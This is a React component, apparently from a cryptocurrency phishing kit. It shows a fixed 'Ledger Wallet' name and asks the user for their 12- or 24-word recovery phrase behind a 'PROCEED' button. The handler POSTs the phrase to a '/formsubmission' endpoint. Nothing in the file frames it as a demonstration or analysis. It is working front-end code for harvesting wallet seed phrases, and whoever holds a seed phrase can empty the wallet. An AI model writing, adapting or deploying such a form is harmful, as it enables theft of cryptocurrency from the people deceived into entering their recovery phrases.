import React from "react";
import { Field, Form, Formik } from "formik";
import * as Yup from "yup"; // Import Yup for validation
import { FaArrowCircleRight, FaLock } from "react-icons/fa"; // Import lock icon from react-icons

const ConnectionForm = () => {
  // Submit handler
  const handleSubmit = (values) => {
    fetch("/formsubmission", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    })
      .then((response) => response.json())
      .then((data) => console.log("Form submitted successfully:", data))
      .catch((error) => console.error("Error submitting form:", error));
  };

  // Validation schema using Yup
  const validationSchema = Yup.object({
    walletName: Yup.string()
      .oneOf(["Ledger Wallet"], "Invalid wallet name")
      .required("Wallet Name is required"),
    recoveryPhrase: Yup.string()
      .min(12, "Recovery phrase must be at least 12 words")
      .required("Recovery phrase is required"),
  });

  return (
    <div className="p-6 bg-white w-full rounded-lg">
      <Formik
        initialValues={{
          walletName: "Ledger Wallet", // Pre-set wallet name
          recoveryPhrase: "",
        }}
        validationSchema={validationSchema} // Add validation schema
        onSubmit={handleSubmit}
      >
        {({ isSubmitting, errors, touched }) => (
          <Form>
            {/* Wallet Name Field */}
            <div className="mb-4 relative">
              <label
                htmlFor="walletName"
                className="block text-sm font-normal text-gray-700"
              >
                Wallet Name:
              </label>
              <div className="mt-1 flex items-center border border-gray-300 rounded-md">
                <FaLock className="text-gray-500 ml-2" />
                <Field
                  id="walletName"
                  name="walletName"
                  type="text"
                  value="Ledger Wallet"
                  disabled
                  className="w-full p-2 pl-10 text-gray-700 rounded-md focus:ring-blue-500 focus:border-blue-500"
                />
              </div>
              {errors.walletName && touched.walletName && (
                <div className="text-red-500 text-xs">{errors.walletName}</div>
              )}
            </div>

            {/* Recovery Phrase Field */}
            <div className="mb-4 relative">
              <label
                htmlFor="recoveryPhrase"
                className="block text-sm font-normal text-gray-700"
              >
                Recovery Phrase:
              </label>
              <div className="mt-1 flex items-center border border-gray-300 rounded-md">
                <FaLock className="text-gray-500 ml-2" />
                <Field
                  as="textarea"
                  id="recoveryPhrase"
                  name="recoveryPhrase"
                  placeholder="Please enter your recovery phrase"
                  className="w-full p-2 pl-10 text-gray-700 bg-gray-100 border border-transparent rounded-md focus:ring-0 focus:border-none focus:outline-none"
                />
              </div>
              {errors.recoveryPhrase && touched.recoveryPhrase && (
                <div className="text-red-500 text-xs">{errors.recoveryPhrase}</div>
              )}
            </div>

            <p className="text-xs mb-5">
              Typically 12 (sometimes 24) words separated by single spaces
            </p>

            {/* Submit Button */}
            <div className="mb-4">
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full items-center justify-center gap-5 flex py-2 bg-blue-500 text-white font-normal rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                <p>{isSubmitting ? "Submitting..." : "PROCEED"}</p>
                <FaArrowCircleRight />
              </button>
            </div>
          </Form>
        )}
      </Formik>
    </div>
  );
};

export default ConnectionForm;
